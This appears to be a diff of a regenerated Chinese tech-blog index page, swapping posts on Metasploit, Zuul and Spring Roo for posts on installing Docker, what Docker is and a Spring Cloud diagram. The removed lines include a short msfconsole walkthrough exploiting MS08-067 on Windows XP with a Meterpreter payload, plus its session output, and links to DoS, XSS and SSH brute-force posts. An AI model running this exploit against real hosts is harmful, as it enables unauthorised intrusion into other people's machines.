@@ -288,7 +288,7 @@
           
           <li class="menu-item menu-item-archives">
     <a href="/archives/" rel="section">
-      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档<span class="badge">208</span></a>
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档<span class="badge">207</span></a>
   </li>
         
         
@@ -378,7 +378,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.wuxinvip.com/2018/03/24/hack/metasploit-hack-windows/">
+    <link itemprop="mainEntityOfPage" href="http://www.wuxinvip.com/2018/03/24/container/install-docker/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="无心">
@@ -397,8 +397,8 @@
         
           <h2 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/03/24/hack/metasploit-hack-windows/" itemprop="url">
-                  使用Metasploit入侵windows
+                <a class="post-title-link" href="/2018/03/24/container/install-docker/" itemprop="url">
+                  install docker
                 </a>
               
             
@@ -442,7 +442,7 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/hack/" itemprop="url" rel="index"><span itemprop="name">hack</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/container/" itemprop="url" rel="index"><span itemprop="name">container</span></a></span>
 
                 
                 
@@ -477,12 +477,15 @@
 
       
         
-          
-            <p>使用msfconsole 查看window发布的漏洞</p>
-<p>运气好的话 你要破解的windows没有打补丁.那么使用该漏洞你就可以直接登陆到windows了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># msfconsole</span><br><span class="line"></span><br><span class="line">msf &gt; search platform: windows xp sp3</span><br><span class="line">msf &gt; search platform: windows 10</span><br><span class="line">msf &gt; search platform: android</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf &gt; info exploit/windows/smb/ms08_067_netapi</span><br><span class="line">使用info查看漏洞信息.</span><br><span class="line"></span><br><span class="line">msf &gt; use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">&gt; set payload windows/meterpreter/bind_tcp</span><br><span class="line">&gt; set RHOST 192.168.0.108  (设置目标主机IP地址)</span><br><span class="line">&gt; exploit</span><br><span class="line">设定攻击方式.攻击ip</span><br><span class="line"></span><br><span class="line">攻击成功:</span><br><span class="line">[*] Started bind handler</span><br><span class="line">[*] Automatically detecting the target...</span><br><span class="line">[*] Fingerprint: Windows XP SP3 - Service Pack 3 - lang:Chinese</span><br><span class="line">[*] Selected Target: Windows XP SP3 Chinese (AlwaysOn NK)</span><br><span class="line">[*] Attempting to trigger the vulnerability...</span><br><span class="line">[*] Sending stage (751104 bytes) to 192.168.0.108</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.0.1:41614 -&gt; 192.168.0.108:4444) at 2016-04-15 17:29:32</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br><span class="line"></span><br><span class="line">失败就尝试其他漏洞</span><br></pre></td></tr></table></figure>
-
-          
+          <p>国内大佬专玩docker地址<br>中文翻译<br><a href="http://www.widuu.com/docker/" target="_blank" rel="noopener">http://www.widuu.com/docker/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">从官方下载</span><br><span class="line">curl https://get.docker.com &gt; /tmp/install.sh</span><br><span class="line">sh install.sh</span><br><span class="line"></span><br><span class="line">从系统镜像元下载</span><br><span class="line">centos：yum install docker</span><br><span class="line">debian: apt-get install docker</span><br><span class="line"></span><br><span class="line">在centos-6 中 docker 与系统自带可执行程序冲突。</span><br><span class="line">执行：</span><br><span class="line">yum -y remove docker</span><br><span class="line">yum install docker-io</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/03/24/container/install-docker/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -496,35 +499,14 @@
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/about-hack/" rel="bookmark">关于漏洞和攻击</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/container/pouch/" rel="bookmark">pouch</a></div>
       
     </li>
   
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/art-infiltration/" rel="bookmark">渗透的艺术</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/dos/" rel="bookmark">DOS攻击工具</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/filter-xss/" rel="bookmark">Filter安全过滤高级最终行（XSS攻击）</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/ssh-violence/" rel="bookmark">ssh远程登陆破解</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/container/what-docker/" rel="bookmark">what is the docker</a></div>
       
     </li>
   
@@ -578,7 +560,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.wuxinvip.com/2018/03/24/spring-cloud/zuul/">
+    <link itemprop="mainEntityOfPage" href="http://www.wuxinvip.com/2018/03/24/spring-cloud/spring-cloud-1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="无心">
@@ -597,8 +579,8 @@
         
           <h2 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/03/24/spring-cloud/zuul/" itemprop="url">
-                  zuul
+                <a class="post-title-link" href="/2018/03/24/spring-cloud/spring-cloud-1/" itemprop="url">
+                  spring cloud 总 架构图
                 </a>
               
             
@@ -684,21 +666,14 @@
 
       
         
-          <p>zuul</p>
-<p>是架设在整个springcloud微服务服务网中的门户模块<br>所有的外界访问请求 都要经过 这个模块<br>zuul结合eureka 可以做到动态服务代理</p>
-<p>实现功能：</p>
-<ul>
-<li>1、身份验证和安全性-识别每个资源的身份验证要求并拒绝不满足的要求</li>
-<li>2、洞察和检测-在边缘跟踪有意义的数据和统计数据、以便为我们提供准确的生产视图</li>
-<li>3、动态路由-根据需要将请求动态路由到不同的后端集群</li>
-<li>4、压力测试-逐渐增加到群集的流量，以衡量表现</li>
-<li>5、加载Shedding-为每种类型的请求分配容量，并删除超出限制的请求</li>
-<li>6、静态响应处理-直接边缘建立响应、而不是将他们转发到内部群集</li>
-<li>7、多区域弹性-跨AWS区域的路由请求、以使我们的ELB使用多样化、并使我们的边缘更接近我们的成员</li>
-</ul>
+          <p><img src="http://upload-images.jianshu.io/upload_images/6434888-d7f0fb7315ad664a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="springcloud 组件集合.png"></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/6434888-6001018c84d36f24.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="springcloud 组件集合.jpg"></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/6434888-aa10c11f1f366701.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="springcloud 组件集合.jpg"></p>
+<p>版权所有 转载 请表明出处</p>
+<p><a href="https://gitee.com/none_heart/base-cloud.git" target="_blank" rel="noopener">相关代码地址</a></p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2018/03/24/spring-cloud/zuul/#more" rel="contents">
+            <a class="btn" href="/2018/03/24/spring-cloud/spring-cloud-1/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -716,7 +691,7 @@
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/spring-cloud/spring-cloud-2/" rel="bookmark">spring cloud 族谱</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/spring-cloud/ribbon/" rel="bookmark">Ribbon</a></div>
       
     </li>
   
@@ -730,7 +705,14 @@
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/spring-cloud/feign-1/" rel="bookmark">Feign服务调用</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/spring-cloud/eureka-1/" rel="bookmark">EUREKA服务治理</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/spring-cloud/spring-cloud-2/" rel="bookmark">spring cloud 族谱</a></div>
       
     </li>
   
@@ -738,13 +720,6 @@
       
       
       <div class="popular-posts-title"><a href="/2018/03/24/spring-cloud/reactor-core/" rel="bookmark">Reactor Core</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/spring-cloud/ribbon/" rel="bookmark">Ribbon</a></div>
       
     </li>
   
@@ -798,7 +773,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.wuxinvip.com/2018/03/24/spring-cloud/spring-roo/">
+    <link itemprop="mainEntityOfPage" href="http://www.wuxinvip.com/2018/03/24/container/what-docker/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="无心">
@@ -817,8 +792,8 @@
         
           <h2 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/03/24/spring-cloud/spring-roo/" itemprop="url">
-                  spring Roo
+                <a class="post-title-link" href="/2018/03/24/container/what-docker/" itemprop="url">
+                  what is the docker
                 </a>
               
             
@@ -862,14 +837,7 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a></span>
-
-                
-                
-                  ，
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/spring-cloud/" itemprop="url" rel="index"><span itemprop="name">spring-cloud</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/container/" itemprop="url" rel="index"><span itemprop="name">container</span></a></span>
 
                 
                 
@@ -904,11 +872,16 @@
 
       
         
-          <p>what？<br>      使用命令行形式构建项目</p>
-<p>下载地址：<a href="https://projects.spring.io/spring-roo/#running-from-shell" target="_blank" rel="noopener">https://projects.spring.io/spring-roo/#running-from-shell</a></p>
+          <p><strong>what is docker?</strong></p>
+<p>百度 告诉我们docker是一个容器</p>
+<p>作为java码头搬砖的 我想到了 spring也是叫做容器</p>
+<p>那么容器是一个什么样的概念? 不由想到了水缸—容器   容器装载水的 与水毫无关系</p>
+<p>spring容器 IOC AOP 都晓得<br>IOC 把对象创建交给spring管理 然后加载到jvm中运行java 程序<br>AOP 面向切面编程.其实就是提供了一个切面模式.能够很好地控制类的加载顺序.或者类的执行顺序</p>
+<p>但是本质上spring容器就是装载java程序的</p>
+<p>那么docker?<br>装载各种程序的.暂时可以理解为一个系统.系统也是一个容器.装载我们运行的程序<br>window装载 exe.        linux装载rpm.        android 装载一类apk的程序             ios装载一类ipa的程序</p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2018/03/24/spring-cloud/spring-roo/#more" rel="contents">
+            <a class="btn" href="/2018/03/24/container/what-docker/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -926,35 +899,14 @@
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/spring-cloud/spring-cloud-2/" rel="bookmark">spring cloud 族谱</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/container/pouch/" rel="bookmark">pouch</a></div>
       
     </li>
   
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/spring-cloud/Hystrix/" rel="bookmark">Hystrix</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/spring-cloud/feign-1/" rel="bookmark">Feign服务调用</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/spring-cloud/reactor-core/" rel="bookmark">Reactor Core</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/spring-cloud/ribbon/" rel="bookmark">Ribbon</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/container/install-docker/" rel="bookmark">install docker</a></div>
       
     </li>
   
@@ -1015,7 +967,7 @@
 
 
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/44/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/44/">44</a><span class="page-number current">45</span><a class="page-number" href="/page/46/">46</a><span class="space">&hellip;</span><a class="page-number" href="/page/70/">70</a><a class="extend next" rel="next" href="/page/46/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/44/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/44/">44</a><span class="page-number current">45</span><a class="page-number" href="/page/46/">46</a><span class="space">&hellip;</span><a class="page-number" href="/page/69/">69</a><a class="extend next" rel="next" href="/page/46/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1064,7 +1016,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">208</span>
+                    <span class="site-state-item-count">207</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
